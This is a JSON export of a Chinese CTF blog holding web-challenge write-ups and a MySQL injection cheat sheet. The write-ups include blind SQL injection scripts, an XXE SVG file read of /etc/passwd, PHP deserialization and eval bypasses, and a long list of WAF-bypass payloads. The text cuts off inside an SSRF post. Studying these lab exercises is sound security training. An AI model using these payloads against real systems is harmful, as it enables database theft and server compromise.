{"meta":{"title":"Tiaonmmn's Littile House","subtitle":null,"description":null,"author":"Tiaonmmn.ZMZ","url":"http://tiaonmmn.github.io","root":"/"},"pages":[{"title":"About Me","date":"2019-05-15T02:43:37.000Z","updated":"2019-09-12T04:55:58.000Z","comments":true,"path":"about/index.html","permalink":"http://tiaonmmn.github.io/about/index.html","excerpt":"","text":"菜鸡一只，没事吹吹水。 And,kibHArn9Ip1uJP8obpr3uQ==,seriously。"},{"title":"categories","date":"2019-05-15T02:25:54.000Z","updated":"2019-09-12T04:56:27.000Z","comments":true,"path":"categories/index.html","permalink":"http://tiaonmmn.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-05-15T02:25:22.000Z","updated":"2019-09-12T04:57:49.000Z","comments":true,"path":"tags/index.html","permalink":"http://tiaonmmn.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Confidence-Final-2020-Haha-jail","slug":"Confidence-Final-2020-Haha-jail","date":"2020-09-13T15:01:03.000Z","updated":"2020-09-13T15:37:31.690Z","comments":true,"path":"2020/09/13/Confidence-Final-2020-Haha-jail/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/13/Confidence-Final-2020-Haha-jail/","excerpt":"","text":"来一道不是BUUOJ上的题，Confidence CTF Final 2020的Haha_jail。 这题有点麻烦，没法做Docker环境（还是我太菜，麻烦有成功的师傅贡献一下Docker镜像） 这题给了两个文件， flag{0980700f-0a4d-45be-a1b2-ec02e8f1a6e4}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Hack","slug":"Hack","permalink":"http://tiaonmmn.github.io/tags/Hack/"},{"name":"RCE","slug":"RCE","permalink":"http://tiaonmmn.github.io/tags/RCE/"}]},{"title":"BUUOJ刷题-Web-Hack-World","slug":"BUUOJ刷题-Web-Hack-World","date":"2020-09-09T09:21:55.000Z","updated":"2020-09-21T08:08:47.072Z","comments":true,"path":"2020/09/09/BUUOJ刷题-Web-Hack-World/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/","excerpt":"","text":"很明显，select flag from flag，然后过滤了一堆东西，发现没有过滤^，异或注入。 12345678910111213import requestsurl=&quot;http://e9104091-792d-476b-8ba6-d151cc2204fe.node3.buuoj.cn/index.php&quot;flag=&quot;&quot;for a in range(17,127): for b in range(32,127): x=requests.post(url,data=&#123; &quot;id&quot;:&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;.format(a,b) &#125;) print(&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;.format(a,b)) if &quot;Hello, glzjin wants a girlfriend.&quot; in x.text: flag+=chr(b) print(flag) break flag{2af40d57-a06b-4621-aef6-6b4ef6a5be7c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJ刷题-Web-EasyJava","slug":"BUUOJ刷题-Web-EasyJava","date":"2020-09-04T09:09:42.000Z","updated":"2020-09-04T09:09:42.829Z","comments":true,"path":"2020/09/04/BUUOJ刷题-Web-EasyJava/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/","excerpt":"","text":"flag{d9d1cc00-1b71-4b22-bd07-0137edb623a1}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJ刷题-Web-SVGMagic","slug":"BUUOJ刷题-Web-SVGMagic","date":"2020-09-03T09:38:33.000Z","updated":"2020-09-03T10:31:03.948Z","comments":true,"path":"2020/09/03/BUUOJ刷题-Web-SVGMagic/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/","excerpt":"","text":"BSidesCTF 2019的SVGMagic。开题让我们上传文件，上传其他文件报500，上传SVG会成功渲染，并显示PNG渲染结果。 SVG实际上是一个XML文档。因此可能出现XXE问题。我们试一下。翻参考文档SVG标签中能插入元素的有&lt;text&gt;，所以直接写一个进去： 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;svg width=&quot;512px&quot; height=&quot;190px&quot; viewBox=&quot;0 0 512 190&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; preserveAspectRatio=&quot;xMidYMid&quot;&gt; &lt;g&gt; &lt;text x=&quot;0&quot; y=&quot;15&quot; fill=&quot;red&quot;&gt;&amp;xxe;&lt;/text&gt; &lt;/g&gt;&lt;/svg&gt; 上传看PNG图片即可得到内容。下一步是拿flag。这题当时环境是让我们拿flag.txt，但是位置不知道。所以盲测。找了一圈，最后猜是在程序根目录下，file:///proc/self/cwd/flag.txt。 flag{f189ef14-aaaa-429d-88eb-08c721bbedff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"},{"name":"SVG","slug":"SVG","permalink":"http://tiaonmmn.github.io/tags/SVG/"}]},{"title":"BUUOJ刷题-Web-Fakebook","slug":"BUUOJ刷题-Web-Fakebook","date":"2020-09-02T03:29:03.000Z","updated":"2020-09-02T08:08:50.200Z","comments":true,"path":"2020/09/02/BUUOJ刷题-Web-Fakebook/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/","excerpt":"","text":"2018网鼎杯的Fakebook。 上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no=1来得到详细信息，以及Blog的内容。SSRF没跑了。 扫源码，发现有robots.txt，user.php.bak，下载得源码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; isValidBlog限制有点严，只允许http(s)协议，要想办法变成gopher或者file协议。 注意到view.php?no=1，随手加个单引号，发现MySQL报错？union select被Ban，那就用注释绕过，然后手注。http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,database(),3,4%23，得到当前数据库为fakebook，[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27%20limit%201),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select table_name from information_schema.tables where table_schema='fakebook' limit 1),3,4%23)，当前表名为users，[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20limit%201,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select column_name from information_schema.columns where table_schema='fakebook' limit 1,1),3,4%23)，得到users表字段为：no、username、passwd、data。[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20data%20from%20users%20limit%200,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select data from users limit 0,1),3,4%23)得到data的内容，返回O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:13:\"www.baidu.com\";&#125;，反序列化串内容正好对应user.php.bak里的UserInfo类。 那么，猜测一下view.php的逻辑，从数据库获取对应no的行，然后反序列化data，并显示到页面上去。那么，我们如果我们修改了反序列化串，就可以使得blog的地址不受isValidBlog()的限制。 随手测一下flag.php，发现存在。那么file://读就可以了。构造反序列化串O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;，然后访问http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(2),3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%23，即可得到flag.php内容。 flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"JarvisOJ-PHPINFO","slug":"JarvisOJ-PHPINFO","date":"2020-09-01T14:05:23.000Z","updated":"2020-09-02T02:54:24.493Z","comments":true,"path":"2020/09/01/JarvisOJ-PHPINFO/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/01/JarvisOJ-PHPINFO/","excerpt":"","text":"JarvisOJ的PHPINFO，Session反序列化题。 给了源码： 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; 传个phpinfo参数就能看phpinfo了，PHP 5.6.21版本。 给了个类OowoO，可以eval()，但是没有任何可反序列化的地方。然后开头的设置session.serialize_handler很奇怪，并且调了session_start()，又没有用到$_SESSION，应该是SESSION的问题了。查了一下session.serialize_handler，参考这个，主要问题是session.serialize_handler为php时会以|分割SESSION项，后接序列化内容。所以，我们可以通过将某些内容（例如变量）截断后添加|，手动添加我们可控的序列化内容。并且注意到phpinfo中serssion.serialize_handler的Master Value和Local Value不同。PHP中Session的处理是在脚本实际执行之前的，因此请求之前Session.serizlize_handler是以php_serialize方式运行的。这就造成了我们是以两种不同的php序列化方式运行，很容易造成反序列化漏洞。 然后回到这道题，我们需要找到一个输入点。回过头翻PHP文档，找SESSION的东西，还真有这里和这里，简单来说，就是如果打开了session.upload_progress.enabled，我们就可以通过form表单提交一个变量到SESSION里去。这个变量名通过phpinfo的session.upload_progress.name查看。 根据示例，我们可以照着上传upload progress变量： 123456&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 随便上传，然后抓包。我们的攻击点在于file的name，将其修改成我们想要的反序列化值即可。 1234567&lt;?phpclass OowoO&#123; public $mdzz=&quot;var_dump(scandir(chr(46)));&quot;;&#125;echo serialize(new OowoO());?&gt; 得到O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"var_dump(scandir(chr(46)));\";&#125;，注意$mdzz字符串最后一定要有一个;（eval）。然后由于requests的zz操作，我们要手动改包： 首先，要以|开头，这是php序列化器的标志。然后所有的双引号都要转义，写Session的时候直接原样读取Content-Disposition的filename，如果不转义，由于我们要写入双引号，会造成Session序列化的截断。 提交就可以列目录了。然后读文件即可，要注意disable_functions和服务器上文件路径。 flag{572ebfac-535f-46f2-873e-f7cc8bc1ecf3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-09-01T13:10:06.501Z","updated":"2019-12-10T12:15:12.664Z","comments":true,"path":"2020/09/01/hello-world/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/01/hello-world/","excerpt":"","text":"硬盘坏了，博客源码都丢了。慢慢补吧，毕业了，尽量抽时间写博客了。 P.S. 本博客所涉及题目全部可在https://github.com/Tiaonmmn中找到。 flag{60afaee8-fee2-4658-bff5-80ee990fd612}","categories":[],"tags":[]},{"title":"BUUOJ刷题-Web-简单注入","slug":"BUUOJ刷题-Web-简单注入","date":"2020-08-25T10:21:01.000Z","updated":"2020-08-26T09:32:17.060Z","comments":true,"path":"2020/08/25/BUUOJ刷题-Web-简单注入/","link":"","permalink":"http://tiaonmmn.github.io/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/","excerpt":"","text":"BJDCTF 2nd的简单注入。 明显注入题。 robots.txt发现有hint.txt，hint.txt里给出查询语句select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]';，并且告诉我们要得到密码。 过滤了一大堆东西，包括select and &amp; \" ' = - 。 然后介绍一种新的Payload，如果我们给username传admin\\会怎样？select * from users where username='admin\\' and password='safasfd'。\\转义符号会吃掉一个单引号，导致username实际上等于admin' and password=，我们就逃逸出一个单引号。然后盲注好了。 很明确，要select password from users。那就很简单了，password构造or ascii(substr((password),1,1))&gt;32，，盲注跑脚本即可。 123456789101112131415import requestsurl=&quot;http://06f46304-b570-4801-aa2d-6641e91f487b.node3.buuoj.cn/&quot;flag=&quot;&quot;for a in range(1,64): for b in range(32,128): c=requests.post(url=url,data=&#123; &quot;username&quot;:&quot;admin\\\\&quot;, &quot;password&quot;:&quot; or ascii(substring(password,&#123;&#125;,1))&gt;&#123;&#125;#&quot;.format(a,b) &#125;) if &quot;stronger&quot; not in c.text: flag+=chr(b) print(flag) break flag{d4131ee5-def8-4c8b-9778-1bab77190f59}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"MySQL注入总结","slug":"MySQL注入总结","date":"2020-08-24T07:58:59.000Z","updated":"2020-09-09T09:07:16.178Z","comments":true,"path":"2020/08/24/MySQL注入总结/","link":"","permalink":"http://tiaonmmn.github.io/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"","text":"or and被过滤 用|| &amp;&amp;代替 union select 被过滤 用/*!union*/ /*!select*/代替 空格被过滤 用/%0a/，或者()。 逗号被过滤 if换成select case when，substring改用substring( from 1 for 1) 报错注入 1.floor() select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); img 2.extractvalue() select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); img 3.updatexml() select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); img 4.geometrycollection() select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); img 5.multipoint() select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); img 6.polygon() select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); img 7.multipolygon() select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); img 8.linestring() select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); img 9.multilinestring() select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); img 10.exp() select * from test where id=1 and exp(~(select * from(select user())a)); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071PHP filter code: preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id);Bypass: 1||1 1&amp;&amp;1PHP filter code: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id);Payload: union select user, password from usersBypass: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;, $id)Payload: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;Bypass: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)Payload: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;Bypass: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)Payload: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;Bypass: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)Payload: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1Bypass: 1 || 1&#x3D;1 into outfile &#39;result.txt&#39;Bypass: 1 || substr(user,1,1)&#x3D;&#39;a&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;)&#x2F;i&#39;, $id)Payload: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1Bypass: 1 || user_id is not nullBypass: 1 || substr(user,1,1) &#x3D; 0x61Bypass: 1 || substr(user,1,1) &#x3D; unhex(61)PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex)&#x2F;i&#39;, $id)Payload: 1 || substr(user,1,1) &#x3D; unhex(61)Bypass: 1 || substr(user,1,1) &#x3D; lower(conv(10,10,36))PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr)&#x2F;i&#39;, $id)Payload: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))Bypass: 1 || lpad(user,7,1)PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr|\\s)&#x2F;i&#39;, $id)Payload: 1 || lpad(user, 7, 1)Bypass: 1%0b||%0blpad(user,7,1)Bypass with commentsid&#x3D;1+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+1,2,3-- Bypass Regex Filter: &#x2F;union\\sselect&#x2F;g1+UnIon&#x2F;**&#x2F;SeLecT&#x2F;**&#x2F;1,2,3-- Bypass preg_replace1+UNunionION+SEselectLECT+1,2,3--If WAF use preg_replace to replace SQL keywords to whitespace1+uni%0bon+se%0blect+1,2,3--For Mod_rewrite, &#x2F;**&#x2F; cannot bypassed. So we use %0b replace &#x2F;**&#x2F;Double encode can bypass some waf1%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;1,2,3%252f%252a*&#x2F;from%252f%252a*&#x2F;users--e.g.id&#x3D;0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user%0D%0A as a newline&#x3D;&#x3D;&gt;0 div 1 union#foo&#x2F;**&#x2F;barselect#foo1,2,currentInline Commentsid&#x3D;1&#x2F;*!uNIon*&#x2F;SeLeCt+1,2,3-- id&#x3D;&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLecT*&#x2F;+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOm&#x2F;*!information_schema*&#x2F;.tables&#x2F;*!WhErE*&#x2F;+&#x2F;*!TaBlE_sChEMa*&#x2F;+like+database()--id&#x3D;1&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F; 时间盲注 sleep benchmark WAF 01 $filter = \"/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\";` 利用position/locate函数。 123456789select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;%s&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;S&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;SY&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;SYN&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-%d)))=hex(&#x27;%s&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-1)))=hex(&#x27;S&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-2)))=hex(&#x27;Y&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-3)))=hex(&#x27;N&#x27;))^&#x27; 02 $filter = \"/||\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|\\\\b(group_)?concat[\\\\s\\\\/\\\\*]*?\\\\([^\\\\)]+?\\\\)|\\bcase[\\s\\/\\*]*?when[\\s\\/\\*]*?\\([^\\)]+?\\)|load_file\\s*?\\\\()|]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJ-刷题-Web-Easy-Calc","slug":"BUUOJ-刷题-Web-Easy-Calc","date":"2020-07-25T15:18:07.000Z","updated":"2020-08-27T06:50:50.046Z","comments":true,"path":"2020/07/25/BUUOJ-刷题-Web-Easy-Calc/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/","excerpt":"","text":"RoarCTF的Easy Calc。 又来万恶的计算器了。 开题就是个输入表达式的页面，注释提示他上了WAF。但是是什么WAF，暂时不清楚。 输入会AJAX发到calc.php里，我们直接打开calc.php发现给了源码。 1234567891011121314151617&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 不允许空格、单双引号、反引号、中括号、$、^、。但是实际上我们在num参数那里输入任何字母都会返回403？403很有意思，calc.php肯定可以正常访问，但我们输入字母后返回403，结合之前的WAF提示，猜测是WAF拦截造成的。 注意一个问题，WAF不一定是PHP级别的WAF，Apache上搞个modsecurity也叫WAF。而如果WAF不能正确理解PHP的特性，就可能造成绕过。详细请参考这个。 那么，我们尝试在URL那里加个空格绕过？输入? num=a，发现正常返回了a，那就好办了。构造Payload。 可以用小括号与.，尝试读目录，scandir需要一个字符串作为参数，由于单双引号被过滤，我们可以使用chr()与.拼接。提交? num=1;scandir(chr(46))，没看到flag，那就看根目录? num=1;scandir(chr(47))，发现有flag，读就完事了。? num=1;show_source(chr(47).chr(102).chr(108).chr(97).chr(103))。 flag{b39e2900-9680-4e81-b077-fa1b0fd8fba9}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJ刷题-Web-EasySQL","slug":"BUUOJ刷题-Web-EasySQL","date":"2020-07-24T14:09:56.000Z","updated":"2020-07-24T15:35:39.390Z","comments":true,"path":"2020/07/24/BUUOJ刷题-Web-EasySQL/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/24/BUUOJ%E5%88%B7%E9%A2%98-Web-EasySQL/","excerpt":"","text":"SUCTF 2019 EasySQL。 确实Easy，Fuzz一下，报错无提示，不准出现union flag prepare等东西。突发奇想试了下;发现可行。1;show databases;返回结果了，那么堆叠注入吧。然而不能prepare任意执行。还得猜语句。 随手输个1，发现返回结果，而输0和字母的时候就不返回了。不能任意执行语句，那么flag要在语句中出现，大胆猜测语句为select $_POST['query']||flag from **。那么，直接输入*,1，会导致SQL语句变成select *,1||flag from **，||仍为or的作用，表中数据全部带出来。 因为输入任何字母会无返回，猜到的有||，因为有字母的时候会当成列名处理，从而语句不合法。 所以，让||不再当or的作用可解决这个问题，即变成select aa||flag from **==select aaflag from **。MySQL有个sql_mode可以控制||的行为，为pipes_as_concat时可以使||成为字符串连接符。所以我们的提交要变成select 1;set sql_mode=pipes_as_concat;select 1，SQL语句变成select 1;set sql_mode=pipes_as_concat;select 1||flag from **，合法的语句。这样就可以 带出flag。 flag{fec33ca7-9bad-492d-985b-c143d31b7260}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"sql_mode","slug":"sql-mode","permalink":"http://tiaonmmn.github.io/tags/sql-mode/"}]},{"title":"BUUOJ刷题-Web-SSRFMe","slug":"BUUOJ刷题-Web-SSRFMe","date":"2020-07-15T16:42:25.000Z","updated":"2020-09-01T13:15:00.642Z","comments":true,"path":"2020/07/16/BUUOJ刷题-Web-SSRFMe/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/","excerpt":"","text":"2020年网鼎杯玄武组的SSRFMe。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpfunction check_inner_ip($url)&#123; $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url); if (!$match_result) &#123; die(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die(&#x27;url fomat error&#x27;); return false; &#125; $hostname=$url_parse[&#x27;host&#x27;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || 